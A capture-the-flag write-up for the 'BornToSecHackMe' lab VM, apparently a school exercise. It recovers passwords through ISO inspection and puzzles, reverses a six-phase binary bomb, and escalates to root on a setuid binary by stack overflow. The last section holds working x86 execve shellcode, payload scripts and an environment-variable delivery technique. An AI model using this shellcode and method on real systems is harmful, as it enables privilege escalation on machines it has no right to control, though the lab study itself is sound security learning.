## Path 1 - ISO enumeration -> Puzzles -> Buffer overflow with shellcode injection @ Env vars

### ISO enumeration
I have no information about any users to login to this, so I decided to inspect the iso.

I mounted the ISO on my host machine to check out the file contents using 

```bash
sudo mount BornToSecHackMe-v1.1.iso /mnt/b2r/
cd /mnt/b2r
```

the file contents looks like a normal bootable ISO, here are the contents

```
nszl@LAPTOP-EREU4AFG:/mnt/b2r$ ls -lah
total 18K
dr-xr-xr-x 7 root root 2.0K Jun 17  2017 .
drwxr-xr-x 8 root root 4.0K Oct 29 09:18 ..
dr-xr-xr-x 2 root root 2.0K Jun 17  2017 .disk
-r--r--r-- 1 root root  201 Jun 17  2017 README.diskdefines
dr-xr-xr-x 2 root root 2.0K Jun 17  2017 casper
dr-xr-xr-x 2 root root 2.0K Jun 17  2017 install
dr-xr-xr-x 2 root root 2.0K Jun 17  2017 isolinux
-r--r--r-- 1 root root  844 Jun 17  2017 md5sum.txt
dr-xr-xr-x 2 root root 2.0K Jun 17  2017 preseed
-r--r--r-- 1 root root    0 Jun 17  2017 ubuntu
```

I looked into the `casper` directory and I saw filesystem information, one of them is a squashfs filesystem.

```
nszl@LAPTOP-EREU4AFG:/mnt/b2r/casper$ ls
README.diskdefines  filesystem.manifest  filesystem.manifest-desktop  filesystem.size  filesystem.squashfs  initrd.gz  vmlinuz
nszl@LAPTOP-EREU4AFG:/mnt/b2r/casper$ file *
README.diskdefines:          ASCII text
filesystem.manifest:         ASCII text
filesystem.manifest-desktop: ASCII text
filesystem.size:             ASCII text
filesystem.squashfs:         Squashfs filesystem, little endian, version 4.0, zlib compressed, 404208299 bytes, 69611 inodes, blocksize: 1048576 bytes, created: Fri Jun 16 22:39:21 2017
initrd.gz:                   gzip compressed data, last modified: Fri Jun 16 22:36:23 2017, from Unix, original size modulo 2^32 40897024
vmlinuz:                     Linux kernel x86 boot executable bzImage, version 3.2.0-91-generic-pae (buildd@lgw01-15) #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015, RO-rootFS, swap_dev 0X4, Normal VGA
```

I wanted to inspect this fs and look at the contents, so I used `unsquashfs` to extract the files for me

```bash
sudo unsquashfs -f -d /mnt/b2r-unsq/ filesystem.squashfs
cd /mnt/b2r-unsq/
ls
```

The result of the `ls` command returns this 
```
nszl@LAPTOP-EREU4AFG:/mnt/b2r-unsq$ ls
bin  boot  dev  etc  home  initrd.img  lib  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
```

seems like a normal linux system directory, I went to cat /etc/passwd to see which users are created

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

Thats a lot of users, and looks like the image also runs certain services we might be able to exploit `mysql, ftp, www-data ...` but we'll explore that later.

I listed the users in the home directories and i got these

```
nszl@LAPTOP-EREU4AFG:/mnt/b2r-unsq$ sudo ls -lah home/
[sudo] password for nszl:
total 36K
drwxrwx--x  9 www-data root     4.0K Oct 14  2015 .
drwxrwxrwx 21 root     root     4.0K Jun 17  2017 ..
drwxr-x---  2 www-data www-data 4.0K Oct  9  2015 LOOKATME
drwxr-x---  6 nszl     nszl     4.0K Jun 17  2017 ft_root
drwxr-x---  3     1003     1003 4.0K Oct 16  2015 laurie
drwxr-x---  4     1002     1002 4.0K Oct 16  2015 laurie@borntosec.net
dr-xr-x---  2     1001 docker   4.0K Oct 16  2015 lmezard
drwxr-x---  3     1004     1004 4.0K Oct 16  2015 thor
drwxr-x---  4     1005     1005 4.0K Oct 16  2015 zaz
```

There are some users created and a LOOKATME folder which has a `password` file, the contents of the file are like so `lmezard:G!@M6f4Eatau{sF"`

I entered the password in and i am able to login to the VM as `lmezard`

### Puzzle
![](https://hackmd.io/_uploads/Hk3zlvjfT.png)

Here is the enumeration of the files in the home directory

![image.png](https://hackmd.io/_uploads/BJBpNBz7T.png)

It says that we need to get a new password, but didnt we already have one? I confirmed the SSH service is running using `netstat -tulpn | grep LISTEN` and tried to SSH as `lmezard` with the same password but It did not work.

![](https://hackmd.io/_uploads/SJTg9Djzp.png)

Looks like we nede to solve the puzzle to get the actual password for SSH.

the `fun` file is a posix tar archive, so I extracted at and there are alot of files..

![image.png](https://hackmd.io/_uploads/HkSyWrM76.png)

They are not actually pcap files, just the extension is similar. All of these files are normal text files which contains a portion of C code.

![image.png](https://hackmd.io/_uploads/HyjQ-Bf7p.png)

After hours of pain, I have made a script that sorts all the files based on their content, and merge them together into 1 big file


```bash=
# extract.sh
grep -l '//file[0-9]*$' * | while read -r file; do
    number=$(tail -n 1 "$file"| sed 's/.*file\([0-9]*\).*/\1/')
    printf "%05d %s\n" "$number" "$file"
done | sort -n | cut -d' ' -f2- | xargs cat > /dev/shm.out.c
```

- `grep -l '//file[0-9]*$'` * finds all files in current directory that contain the pattern ``'//file[0-9]*$'``.
- the output is then iterated, with `$file` being the current indexed element
- `tail -n 1 "$file"` extract the last line of the file where they have `//fileNumber`, and the `sed 's/.*file\([0-9]*\).*/\1/')` command extracts the number
- the output of the above command is stored in the variable number
- `sort -n | cut -d' ' -f2-` sorts the filenames by the number X and removes the numbers from the output.
- `xargs cat > /dev/shm/out.c` concats the contents and merges them into one single file

My script was not completely correct, so I still had to manually use vim to edit the final file. I learnt that in Vim : 

- Use `V` to do a visual lightlight
- `Ctrl + F` to scroll one page down and `Ctrl + B` to scroll ont page up
- Use the `/` to find strings

After everything is done and compiled, I get the output 
![image.png](https://hackmd.io/_uploads/HJ4MQHG7p.png)

The plaintext is `Iheartpwnage`, and the ciphertext after SHA 256 is `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Accodring to the instructions, I should be able to login as 'laurie', so lets give it a try...

![image.png](https://hackmd.io/_uploads/HJLWHrf7a.png)
And it works

### Bianry Reverse engineering 

![image.png](https://hackmd.io/_uploads/ByIEHBMQ6.png)

And we have another puzzle... This time, its to another user called `thor` and we are given an executable named `bomb`

The binary strings are abit sus, this might be a fork bomb or some sort.. but we ball
![image.png](https://hackmd.io/_uploads/B1eeLHG76.png)

nevermind im just paranoid, no form bomb here (yet)?

![image.png](https://hackmd.io/_uploads/S1cE8HzXa.png)

I tried messing around with it, looks like it opens arguments and reads from stdin as well

![image.png](https://hackmd.io/_uploads/rytY8SMma.png)

below are the lib calls from ltrace, nothing intuitive, just assigning a signal handler, read input and printf.

```
laurie@BornToSecHackMe:~$ ltrace ./bomb README
__libc_start_main(0x80489b0, 2, 0xbffff804, 0x80486e0, 0x80495e4 <unfinished ...>
__register_frame_info(0x804b484, 0x804b64c, 0xb7e5ee55, 0xb7fed280, 0)    = 0
fopen("README", "r")                                                      = 0x804c008
signal(2, 0x08048f50)                                                     = NULL
printf("Welcome this is my little bomb !"...Welcome this is my little bomb !!!! You have 6 stages with
)                             = 59
printf("only one life good luck !! Have "...only one life good luck !! Have a nice day!
)                             = 44
fgets("Diffuse this bomb!\n", 80, 0x804c008)                              = 0x0804b680
printf("\nBOOM!!!\n"
BOOM!!!
)                                                     = 9
printf("The bomb has blown up.\n"The bomb has blown up.
)                                        = 23
exit(8 <unfinished ...>
__deregister_frame_info(0x804b484, 4, 3, 0x804c008, 0xb7fffa74)           = 0x804b64c
+++ exited (status 8) +++
```

If no further information can be obtained, I guess we will need to reverse engineer it. since GDB is installed in our machine, we are able to launch GDB with a test input file using 
```
gdb --args ./bomb testfile
```

I also have the `gdbinit` file like the following
```
set disassembly-flavor intel
lay asm
lay reg
tty /dev/pts/1
```

There is a function named phase1 in the assemble, so I would want to set a breakpoint there 

![image.png](https://hackmd.io/_uploads/S1NHaI7X6.png)


Upon running the program, looks like they have a symbol that checks if a string is equal or not. 

![image.png](https://hackmd.io/_uploads/BknopLXmT.png)

And eventually, we will reach a strlen call, we should be able to see what strings is it measuring. The first string its measuring is our input file, 

![image.png](https://hackmd.io/_uploads/Bk-CpIQQa.png)
![image.png](https://hackmd.io/_uploads/HypN08Q7a.png)

And upon the second calling of strlen, we are able to see the string that they are measuring - `Public speaking is very easy.` , this might be the clue for the first part of the bomb.

![image.png](https://hackmd.io/_uploads/rypXJP7Qa.png)

The second part was though, I eventually figured out that i need to pass in 6 numbers like this `1 11 111 111 11 11`, and they used that to measure the first criteria of the bomb like so

![image.png](https://hackmd.io/_uploads/By09GYXm6.png)

After the read the numbers, they validate the numbers in a weird way like so:

```
hardcode 1
hardcode 2
3 * numbers[1]
4 * numbers[2]
```

which gives a general formula 
```
n*i

where n is the result of last equation
where i is the current iterated index
```

following the rule, the numbers `1 2 6 24 120 720` and it works so far

```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!

```

For the third phase, the password is `5t458`. 

For phase 4, it has a function called `func4` which takes the line as input and is recursive. 

![image](https://hackmd.io/_uploads/By-VyD07p.png)

The recirsive function maps the input to output like so 
```
1 - 1
2 - 2
3 - 3
4 - 5
5 - 8
6 - 13
7 - 21
```

This looks like a fibonacci-ish sequence, and its comparing the output to 0x37, which is 55 in decimal. The number should map to number 9.

Turns out it was correct, we are moving on to the next stage.

![image](https://hackmd.io/_uploads/S1LxgwC7a.png)

The keys so far are like so
```
Public speaking is very easy.
1 2 6 24 120 720
5t458
9
```

for stage 5, it first expects a string of length 6, and it compares it to a string which seems like `giants` based on the stringlength argument.

However, i did notice my input string `oolala` gets transformed into `ggusus` when strlen is called on it. which means this also implies an encryption.

I did some case analysis and obtatined this mapping based on the behaviour of the code 
```
a - s
b - r
c - v
d - e
e - a
f - w
g - h
h - o
i - b
j - p
k - n
l - u
m - t
n - f
o - g
p - i
q - s
... repeats
```

To form the encrypted string `giants`, we the input should be `opekma`. Turns out it was correct. Our keyfile should now look like so

```
Public speaking is very easy.
1 2 6 24 120 720
5t458
9
opekmq
```

Phase 6 calls the `read_six_numbers` function, similar to phase 2.
![image](https://hackmd.io/_uploads/SJuyIl1N6.png)

After doing some studying, i find out these rules for key checking

```
1. (all numbers - 1) < 5
2. all numbers must be unique

```
After the initial validation, it looks like there is another section, which involves comparing the numbers `432, 212, 997, 301, 725, 253` which may be infered by the following data. 

![image](https://hackmd.io/_uploads/r1XM3GyEa.png)

the single-digit numbers beside each individual 3 digit numbers may represent our input, so I decide to shuffle the input to validate any changes

The following is the access sequence for input `4 6 5 3 2 1`

![image](https://hackmd.io/_uploads/HJtQMX1Na.png)

And the following is the access sequence for `4 1 2 3 5 6`
![image](https://hackmd.io/_uploads/BJe9zQ1Ea.png)

turns out the number beside the digits is just node number, the input affects access seqeunce to compare. 

Looking at the hint, number 4 (node 4) is placed at the first index. Which means that number 4 being accessed first is correct. I also noticed that they are comparing the elements beside each other. E.G if my input is `1 3 2 4 5 6`, i will compare the value of (node 1 > node 3) -> (node 3 -> node 2).... 

This means that the value of the nodes needs to be sorted for the checking to pass.

And since we have 6 numbers corresponding to 6 nodes, `432(n6), 212(n5), 997(n4), 301(n3), 725(n2), 253(n1)`, we need to arrange them like so to make it sorted: `997(n4) 725(n2) 432(n6) 301(n3) 253(n1) 212(n5)`.

Since the key is which nodes will get access first from left to right, our key for this phase will be `4 2 6 3 1 5`

Our final key will now look like
```
Public speaking is very easy.
1 2 6 24 120 720
5t458
9
opekmq
4 2 6 3 1 5
```

Trim them and remove newlines and spaces, you will get the password to the thor user
`Publicspeakingisveryeasy.126241207205t4589opekmq426315`

We also need to switch the last 2 character and last 3rd character according to the subject
![image](https://hackmd.io/_uploads/SyCSwmyVa.png)

which results in 
`Publicspeakingisveryeasy.126241207205t4589opekmq426135`


![image](https://hackmd.io/_uploads/ByY9H7yNp.png)
Doesnt work... Upon double checking the README, I realized that phase 3 might have more than 1 answer, I went back to check and made sure this time I chose the answer with a b inside - `1 b 214` or `2 b 755`. The former worked.

``
```
Public speaking is very easy.
1 2 6 24 120 720
1b214
9
opekmq
4 2 6 3 1 5
```

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`

![image](https://hackmd.io/_uploads/ryxIOQ14p.png)
And it worked

### Turtle
There is a file called `turtle` in the home directory of thor

```
.
.
.

Recule 200 spaces
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
thor@BornToSecHackMe:~$ import turtle
```

which contains python turtle instructions. I need to build a python script to tokenize, parse and execute the turtle which may give me a graphical clue. The script is as follows.

```python=
import turtle

t = turtle.Turtle()
t.speed(10) # 1:slowest, 3:slow, 5:normal, 10:fast, 0:fastest

a = """Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
.
.
.
.
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces"""


for line in a.split("\n"):
    tokens = line.split(" ")
    action = tokens[0]
    
    if action == "Tourne" :
        direction = tokens[1]
        magnitutde = tokens[3]
        if direction == "gauche" :
            t.left(int(magnitutde))
        else :
            t.right(int(magnitutde))
            
    if action == "Avance" :
        magnitutde = tokens[1]
        t.forward(int(magnitutde))
    
    if action == "Recule" :
        magnitutde = tokens[1]
        t.backward(int(magnitutde))



```

![2023-11-14-14-45-58-min](https://hackmd.io/_uploads/Hy2bO9x4p.gif)

As we can see, it spells out **SLASH**. I tried that passwork but it didnt work. I noticed the last time of the README, `Can you digest the message? :)` which suggests an MD5 digest. I went ahead to do it with an online tool and I got this `646da671ca01bb5d84dbb5fb2238dc8e`.

I tried that as my password for the `zaz` user and it worked
![image](https://hackmd.io/_uploads/B1R-tqx4a.png)

### Shellcode injection via buffer overflow
Here are the enumeration results
![image](https://hackmd.io/_uploads/HkGd5clVp.png)

it suggested that there is a setuid and setgid binary. Which means that file will be executed as the owner, which is root. We have to find a way to execute `whoami` inside the `exploit_me` binary

Upon closer inspection of the `exploit_me` binary, it reads  the first argument, strcpy to some buffer and calls puts to print the read result. 

I tried to put more characters to test for buffer overflow, turns out the program did buffer overflow (SEGFAULT). Which means this binary is vulnerable against a buffer overflow attack.
![image](https://hackmd.io/_uploads/SyLip9gEa.png)

After watching [this video](https://www.youtube.com/watch?v=ncBblM920jw&t=536s) and reading a bit of [this book](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf) to get an idea on how this would work, my strategy is to : 

1. Fuzzing and finding the offset to the return address 
2. Generate test payload and verify step 1 correctness
3. Look for JMP ESP in program. If it is available, put shellcode behind test payload and change payload to the pointer to JMP ESP
4. If JMP ESP is not in the program, put shellcode in a environment variable and change payload to excecute the pointer to environment variable
5. Find a way to deliver the payload via argv of program

### Step 1 and 2 - fuzzing and finding saved eip offset 
I have made a python script that repeatedly print out a pattern of characters like so

```python=
# payload.py
uppercase_chars = [chr(i) for i in range(65, 91)]
lowercase_chars = [chr(i) for i in range(97, 123)]
numbers = [chr(i) for i in range(48, 58)]

for upper in uppercase_chars:
    for lower in lowercase_chars:
        for number in numbers:
            print(f'{upper}{lower}{number}', end='')
```

The output looks like this
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab
9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8A
d9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae
...
x5Zx6Zx7Zx8Zx9Zy0Zy1Zy2Zy3Zy4Zy5Zy6Zy7Zy8Zy9Zz0Zz1Zz2Zz3Zz4
Zz5Zz6Zz7Zz8Zz9
```

To pass our payload into the program in the gdb shell, i can do

```
gdb exploit_me
set args `shell python payload.py`
```

To automate this, I made a .gdbinit. I also set up another tty for the debugging session
```
set disassembly-flavor intel
lay asm
lay reg
set args `python payload.py`
tty /dev/pts/1
b main
```

After `strcpy` finishes executing, we can use `info frame` to view the current stack frame info. Which also lets us see the return address of the saved EIP

![image](https://hackmd.io/_uploads/HyzpQLEN6.png)

EIP is at 0x37654136, which translates to `7eA6`, however, since the system stores register values using **little endian**, we need to reverse it to `6Ae7` . We do a lookup in the payload string, the section `6Ae7` is at position `140`. Which means we need to have a payload of length 140 to be able to manipulate the saved EIP

```python=
# get_offset.py

string = """Aa0Aa1Aa....y0Zy1Zy2Zy3Zy4Zy5Zy6Zy7Zy8Zy9Zz0Zz1Zz2Zz3Zz4Zz5Zz6Zz7Zz8Zz9"""
substring = '6Ae7'
position = string.find(substring)
print(position)
```

We will now change our payload code to verify this.
```python=
payload = "A"*140 + "B" * 4 
print(payload)
```

The screenshot below verifies that the saved eip is 0x42424242, which is "BBBB" - the 140th byte onwards.
![image](https://hackmd.io/_uploads/S1b0LUENa.png)

### Step 3 - finding pointer to JMP ESP
The instruction we are looking for is `JMP ESP`, we can do so by printing the instructions of the binary and searching for jmp using ` objdump --full-contents -D exploit_me | grep jmp`

![image](https://hackmd.io/_uploads/BJi15L4Vp.png)

As we can see, we dont have the instruction we want to jump to. So we will proceed with the following step

### Step 4 - make your own pointer to shellcode via environemnt variables

> https://masterccc.github.io/memo/shellcode/

The code we are trying to run is 
```c
#include <unistd.h>

int main(void){
  execve("/bin/sh", NULL, NULL);  
}
```

Translated to assembly, it looks like 
```
section .text
global _start

_start:
   ; clear the registers
   xor eax, eax
   xor ebx, ebx
   xor ecx, ecx
   xor edx, edx

   ; push the string "/bin/sh" onto the stack
   push 0x68732f6e
   push 0x69622f2f
   mov ebx, esp

   ; set up the arguments for the execve syscall
   push eax
   push ebx
   push eax

   ; make the execve syscall
   mov al, 0x0b
   int 0x80

```

When assembled using [this site](https://defuse.ca/online-x86-assembler.htm#disassembly), the corresponsing instructions will be `"\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x50\xB0\x0B\xCD\x80"
`. To output the byte literal, we can do so in python 
`print("\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x50\xB0\x0B\xCD\x80")`

With that information, we can export the shellcode inside an environment variable 

![image](https://hackmd.io/_uploads/r10F9PV4p.png)

### Step 5 - Find a way to deliver the payload via argv of program
Now when we go back to GDB, we are able to see our environment variable in the stack and they are located waay below the EBP. I was able to inspect them using `x/50s $esp+450` which prints stack content and I see the env var in address `0xbffff90c` and the shellcode should begin at address `0xBFFFF916`. Reverse it for little endianess and make it hex string literal, we get `\x16\xf9\xff\xbf"`

now our payload script looks like this
```python=
pointer_to_shellcode = "\x16\xf9\xff\xbf"
payload = "A"*140 + pointer_to_shellcode
print(payload)
```

Here is how the address looks like in GDB
![image](https://hackmd.io/_uploads/SkvSsFN4p.png)

The code didnt work and I got some unexpected instructions when I jumped to my shellcode (shown below). turns out when I used the assembler tool, I did not specify the correct architecture (x64 instad of x86) and that same assembly that generated the opcode was different hence the weird instructions in the end. 
![image](https://hackmd.io/_uploads/BkFORF4E6.png)

Of course, I had to get the env pointer again
![image](https://hackmd.io/_uploads/B15DyqNNT.png)


The shellcode.py file is changed to 
`print("\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x50\xB0\x0B\xCD\x80")`

And payload.py is changed to
![image](https://hackmd.io/_uploads/B11Vyq4Np.png)

I tested the shellcode in GDB and it did seem that I managed to execute the shell command in that environment.
![image](https://hackmd.io/_uploads/BJCdkqNVp.png)

However, I get segfaults and invalid instructions if I try to launch it without GDB. It should not be the shellcode, so it might have something to do with the payload or the offset.

After some searching, I realized that GDB also adds environemt variables and we all have been building our exploit on the additional environment variables. Which might be causing our payload or offset to be incorrect.

The environment variables added are the `LINES` and `COLUMNS` variable, which is used by GDB internally to determine display dimensions. These variables **DOES NOT** exist if i launch it normally.

Hence, we need to regenerate the payload with a fresh env instead.
![image](https://hackmd.io/_uploads/S1zhE94N6.png)


The new pointer to the shellcode
![image](https://hackmd.io/_uploads/r1QqEq4NT.png)

And the new payload 
```
pointer_to_shellcode = "\xc1\xff\xff\xbf"
payload = "A" *140 + pointer_to_shellcode
print(payload)
```

Once those changes are applies, we should be able to execute a shell as root.
![image](https://hackmd.io/_uploads/r1Nor944a.png)